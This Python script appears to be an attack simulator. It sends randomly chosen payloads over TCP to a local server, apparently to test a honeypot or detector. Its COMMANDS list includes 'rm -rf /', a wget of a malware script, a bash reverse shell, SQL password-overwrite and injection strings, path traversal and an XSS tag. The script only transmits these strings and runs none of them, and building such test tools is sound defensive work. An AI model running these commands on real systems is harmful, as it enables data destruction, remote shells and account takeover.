import socket
import time
import random

# Configuration
SERVER_IP = '127.0.0.1'  # Server IP address
SERVER_PORT = 5000       # Server port number
ATTACK_DURATION = 60     # Duration of the attack simulation in seconds
COMMANDS = [
    'ls', 'pwd', 'echo $PATH', 'rm -rf /', 'wget http://malicious.com/malware.sh',
    'nc -zv 192.168.1.1 1-100', '/bin/bash -i > /dev/tcp/192.168.1.1/8080 0<&1 2>&1',
    'UPDATE users SET password = "hacked" WHERE id = 1;', 'INSERT INTO users (username, password) VALUES ("hacker", "p@ssword");',
    'netstat', 'telnet 192.168.0.1 25', '../etc/passwd', 'admin\' OR 1=1 --', '<script>alert("XSS")</script>'
]


def generate_command():
    """Randomly choose a command from the list."""
    return random.choice(COMMANDS)


def random_interval():
    """Generate a random interval to mimic human behavior."""
    return random.uniform(0.5, 3.0)  # Between 0.5 and 3 seconds


def run_attack(sock, num_attacks):
    """Run the attack simulation for the given number of attacks."""
    for _ in range(num_attacks):
        cmd = generate_command()
        sock.sendall(cmd.encode('utf-8'))
        print(f"Sent: {cmd}")
        time.sleep(random_interval())


def main():
    """
    Runs the show
    """
    start_time = time.time()
    # Random number of connections between 2 and 3
    num_connections = random.randint(2, 3)
    print(
        f"Lanuching Sim Attack at {start_time}.\nUsing a total number of {num_connections} independent connections")
    for _ in range(num_connections):
        # Random number of attacks per connection
        print(f"Sim Attack number: {_}.\n")
        num_attacks = random.randint(5, 20)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.connect((SERVER_IP, SERVER_PORT))
            run_attack(sock, num_attacks)

    end_time = time.time()
    attack_duration = end_time - start_time
    print(f"Attack simulation completed in {attack_duration:.2f} seconds.")


if __name__ == "__main__":
    main()
